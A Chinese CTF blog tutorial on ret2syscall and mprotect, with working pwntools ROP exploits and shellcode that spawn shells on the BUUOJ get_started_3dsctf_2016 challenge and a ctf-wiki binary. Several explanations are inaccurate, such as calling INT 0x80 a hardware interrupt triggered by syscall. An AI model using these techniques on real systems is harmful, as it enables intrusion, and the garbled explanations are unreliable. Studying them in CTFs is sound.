---
title: ret2syscall+mprotect函数介绍
date: 2023-07-09 21:49:25
tags: [Pwn,Stack,ret2syscall]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscover.jpg"
---

ret2syscall 即控制程序执行系统调用来获取 shell。当发现没有system可以直接调用，并且发现通过函数泄露地址去猜libc也不太适用，没法泄露和计算libc的加载基地址的时候，就要使用ret2syscall。

# 一、ret2syscall

## 1.1 介绍

ret2syscall，顾名思义，就是将返回地址指向系统调用函数，从而实现在用户态执行特权指令的目的。

函数系统调用，指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务。系统调用提供用户程序与操作系统之间的接口。具体来说，当一个程序调用系统调用函数时，系统会将当前程序的上下文（包括程序计数器、堆栈指针等）保存在内核栈中，并将控制权交给操作系统。在系统调用完成后，系统会将上下文恢复，并将控制权交回给程序。但是，如果系统调用函数的参数验证不足或者越界访问，就可能导致攻击者通过构造恶意输入来篡改内核栈中的返回地址，使得程序在返回时跳转到特权指令执行。

ret2syscall技术利用了这种漏洞，通过将返回地址指向系统调用函数来实现用户态执行特权指令的目的。具体实现方法包括以下步骤：

1. 定位系统调用函数的地址：攻击者需要先通过某种方式（如利用漏洞）获取系统调用函数的地址。
2. 构造恶意输入：攻击者需要构造恶意输入，使得程序在执行系统调用时，将返回地址指向系统调用函数。
3. 执行恶意输入：攻击者将构造好的恶意输入传递给程序，程序在执行系统调用时，会跳转到特权指令执行。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys1.png?x-oss-process=style/watermark" style="zoom:80%;" />

## 1.2 INT 80中断

INT 80中断是x86架构计算机上的一种硬件中断。Linux系统通过软中断指令（如syscall指令）来触发INT 80中断，从而实现系统调用。具体来说，当程序需要执行一个系统调用时，它会使用syscall指令将系统调用的编号和参数传递给INT 80中断处理程序。

INT 80中断处理程序会根据系统调用的编号执行相应的服务程序，完成相应的操作，并将结果返回给程序。服务程序通常由操作系统内核提供，包括文件系统、网络通信、进程管理、内存管理等操作。

**32位系统中，应用程序调用系统调用的过程是：**

1. 把系统调用的编号存入 EAX；（用系统调用号来区分入口函数）
2. 把函数参数存入其它通用寄存器；
3. 触发 0x80 号中断（int 0x80）。

**攻击原理：**

所有的系统调用都是通过0x80号中断来实现的，因此如果我们希望通过系统调用来获取 shell ，就需要建立第0x80终端，这就需要把系统调用的参数放入各个寄存器。通常我们选择构造 execve("/bin/sh",NULL,NULL) 函数。

首先我们需要知道 execve 的系统调用号是多少？可以直接在网上进行查询。参考链接：https://www.jianshu.com/p/324ef88a5213

execve 系统调用号为11，换算成16进制，也就是0xb。因此想要构造execve 函数，构造完后寄存器的值应该如下：eax指向0xb的地址，ebx指向/bin/sh的地址，ecx参数为0，edx参数也应该为0。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys2.png?x-oss-process=style/watermark" style="zoom:80%;" />

除了INT 80中断外，x64架构的Linux系统还使用其他类型的系统调用，例如通过软中断（signal）实现信号处理等。这将会在另外一篇博客[SROP](https://wutong01304.github.io/2023/07/15/SROP/)中进行介绍。

## 1.3 例子1

例题：https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop 

参考了yinchen大佬的视频：https://www.bilibili.com/video/BV177411p7Hu/?spm_id_from=333.999.0.0&vd_source=4481f768294d5110af6b9e0ab6a40ddd

视频下面也给出了这道题目的附件：https://pan.baidu.com/s/1fbeBjaoX-rmW_BZRT7lxbg  （跟题目是一个文件，上面下载不了可以下这个）

反汇编查看main函数：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys3.png?x-oss-process=style/watermark" style="zoom:80%;" />

v4没有限制输入长度，可以溢出。

使用ROPgadget查找pop命令，来构造寄存器：

```shell
ROPgadget --binary rop  --only 'pop|ret' | grep 'eax' 
```

查找到pop eax，ret：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys4.png?x-oss-process=style/watermark" style="zoom:80%;" />

查找到pop ebx，ret:

```shell
ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
```

注意这里有连续三个的寄存器，刚好可以控制ebx、ecx、edx：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys6.png?x-oss-process=style/watermark" style="zoom:80%;" />

查找 'bin/sh' 字符：

```shell
ROPgadget --binary rop --string '/bin/sh'
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys5.png?x-oss-process=style/watermark" style="zoom:80%;" />

查找 INT 80中断：

```shell
ROPgadget --binary rop --only 'int'
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys7.png?x-oss-process=style/watermark" style="zoom:80%;" />

查找完毕后就可以构造溢出数据了：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys8.png?x-oss-process=style/watermark" style="zoom:80%;" />

程序转到返回地址后，会依次修改寄存器的值，从而构造execve函数执行条件，最后触发int 0x80中断，来进行系统调用，执行execve函数。

exp：

```python
from pwn import *
p=process('./rop') #以本地为攻击环境
int_addr=0x8049421
bin_addr=0x80be408
pop_other_ret=0x806eb90
pop_eax_ret=0x80bb196
payload='a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)
p.sendline(payload)
p.interactive()
```

本地被打通：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys9.png?x-oss-process=style/watermark" style="zoom:80%;" />

## 1.4 例子2

题目：https://buuoj.cn/challenges#get_started_3dsctf_2016  。题目名字：get_started_3dsctf_2016

反汇编：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys10.png?x-oss-process=style/watermark" style="zoom:80%;" />

同样v4没有限制输入长度，可以溢出。

细心观察可以发现，有一个get_flag函数，令 if ( a1 == 814536271 && a2 == 425138641 )满足，可以直接获得flag:

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys11.png?x-oss-process=style/watermark" style="zoom:80%;" />

具体来说，通过溢出使其转到get_flag函数，然后使get_flag的参数等于814536271和425138641的地址就可以了（直接在IDA里面就可以找到）。注意程序需要正常退出才能回显，所以要使flag的返回地址后加一个退出地址。

```python
from pwn import *
p=remote('node4.buuoj.cn',27237)
get_flag=0x080489A0 #get_flag函数地址
arg0=0x308CD64F #814536271数字存放地址
arg1=0x195719D1 #425138641数字存放地址
exit=0x0804E6A0 #exit函数地址
payload = 'a'*56+p32(get_flag)+p32(exit)+p32(arg0)+p32(arg1)
p.sendline(payload) 
p.interactive()
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys20.png?x-oss-process=style/watermark" style="zoom:80%;" />

除此之外，使用ret2syscall方法进行攻击：同样使用ROPgadget查找pop命令，来构造寄存器：

```python
ROPgadget --binary get_started_3dsctf_2016  --only 'pop|ret' | grep 'eax' 
ROPgadget --binary get_started_3dsctf_2016  --only 'pop|ret' | grep 'ebx' 
ROPgadget --binary get_started_3dsctf_2016  --only 'int'
ROPgadget --binary get_started_3dsctf_2016 --string '/bin/sh'
```

pop eax、ebx、ecx、edx和 int 80的地址都找到了：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys13.png?x-oss-process=style/watermark" style="zoom:80%;" />

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys14.png?x-oss-process=style/watermark" style="zoom:80%;" />

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys15.png?x-oss-process=style/watermark" style="zoom:80%;" />

但是bin/sh的字符没有找到，这要怎么办呢？我们可以通过**read**函数向**bss段**输入一个bin/sh字符。

首先在IDA查看read函数地址：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys19.png?x-oss-process=style/watermark" style="zoom:80%;" />

然后我们要确定bss段地址，输入以下命令查找：

```shell
readelf -S get_started_3dsctf_2016 | grep bss
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys17.png?x-oss-process=style/watermark" style="zoom:80%;" />

在IDA里面寻找一段没有数据的bss段地址，在这里，选取的是 0x0x080ebf8A：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys18.png?x-oss-process=style/watermark" style="zoom:80%;" />

然后需要构造read函数的参数。构造read函数如下：read(0,bss,0x10)，即向bss地址处写入0x10字节的内容。

在执行完read后，为了使程序继续执行我们构造好的系统调用，需要把压入的参数压出，因此我们在 read 返回地址处填入一个可以pop 3个的地址。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys22.png?x-oss-process=style/watermark" style="zoom:80%;" />

构造好的栈溢出如下：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys21.png?x-oss-process=style/watermark" style="zoom:80%;" />

exp：

```python
from pwn import *

r = remote('node4.buuoj.cn',27237)
elf = ELF('./get_started_3dsctf_2016')
read=0x0806e140
bss=0x080ebf8a
pop_3_ret=0x080509a5
int_80h = 0x0806d7e5
pop_eax = 0x080b91e6
pop_dcb = 0x0806fc30

payload = 'a'*0x38+p32(read)+p32(pop_3_ret)+p32(0)+p32(bss)+p32(0x10) #read函数部分
payload += p32(pop_eax) + p32(0xb)+ p32(pop_dcb) + p32(0) + p32(0) + p32(bss)+ p32(int_80h) #系统调用部分
r.sendline(payload)

payload='/bin/sh\x00' #将bin/sh字符写入bss段
r.sendline(payload)
r.interactive()
```

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/sys12.png?x-oss-process=style/watermark" style="zoom:80%;" />

# 二、mprotect函数

## 2.1 介绍

mprotect函数是一个系统调用，用于修改进程的内存区域的保护属性。它位于C标准库的mprotect.h头文件中，并提供了一个接口供程序员使用。mprotect函数的原型如下：

```c
int mprotect(void *addr, size_t len, int prot);
```

参数说明：

1. addr：指向要修改保护属性的内存区域的起始地址。addr必须是一个内存页的起始地址，简而言之为页大小整数倍。
2. len：要修改保护属性的内存区域的大小（以字节为单位）。最好为页大小整数倍
3. prot：内存要赋予的权限，可以使用以下常量进行设置：

- PROT_NONE：该内存区域不可访问。
- PROT_READ：该内存区域可读。
- PROT_WRITE：该内存区域可写。
- PROT_EXEC：该内存区域可执行。

mprotect函数的作用是将指定内存区域的保护属性更改为指定的值。通过修改保护属性，可以控制进程是否可以读取、写入或执行相应的内存区域。简单来说，mprotect()函数把自addr开始的、长度为len的内存区的保护属性修改为prot指定的值。然后prot=7，可读可写可执行。

## 2.2 例子

使用第一节的第二个例子，即题目：get_started_3dsctf_2016

在IDA中进行搜索，可以看到文件中存在mprotect函数：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/m1.png?x-oss-process=style/watermark" style="zoom:80%;" />

使用gdb进行调试，下断点运行以后，使用vmmap查看内存权限：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/m2.png?x-oss-process=style/watermark)

可以把 0x080ea000 到 0x080ec000 都修改成可以执行的。因此得到mprotect的参数（0x080ea000，0x2000,0x7）。同样为了使程序继续执行我们构造好的系统调用，需要把压入的参数压出，因此我们在 read 返回地址处填入一个可以pop 3个的地址

然后使用read函数写入shellcode。和上一节构造read的方法相同。构造溢出如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/m3.png?x-oss-process=style/watermark)

exp:

```python
# _*_ coding:utf-8 _*_
from pwn import *
elf = ELF('./get_started_3dsctf_2016')
#sh = process('./get_started_3dsctf_2016')
sh = remote('node4.buuoj.cn',27237)
pop3_ret = 0x0809e4c5
mem_addr = 0x080ea000 #可读可写的内存,但不可执行
mem_size = 0x2000    #修改大小
mem_proc = 0x7       #可代表可读可写可执行
mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
payload_01 = 'A' * 0x38
payload_01 += p32(mprotect_addr)
payload_01 += p32(pop3_ret)   #执行完mprotect的返回地址,使esp往下+12
payload_01 += p32(mem_addr)   #mprotect函数参数1 修改的内存地址
payload_01 += p32(mem_size)   #mprotect函数参数2 修改的内存大小
payload_01 += p32(mem_proc)   #mprotect函数参数3 修改的权限
payload_01 += p32(read_addr)  #执行完上面pop3_ret后到read函数
payload_01 += p32(pop3_ret)   #执行完read后将返回到pop3_ret指令,又继续使esp+12到mem_addr
payload_01 += p32(0)          #read函数参数1 ,从输入端读取
payload_01 += p32(mem_addr)   #读取到的内容复制到指向的内存里
payload_01 += p32(0x100)      #读取大小
payload_01 += p32(mem_addr)   #这里就是shellcode了
sh.sendline(payload_01)
#gdb.attach(sh) #本地调试用
payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') #生成x86架构下的shellcode
sh.sendline(payload_sh)#这就是read读入的内容，即shellcode
sh.interactive()
```

成功修改内存：

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/m5.png?x-oss-process=style/watermark" style="zoom:80%;" />

获取flag:

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2syscall/m4.png?x-oss-process=style/watermark" style="zoom:80%;" />
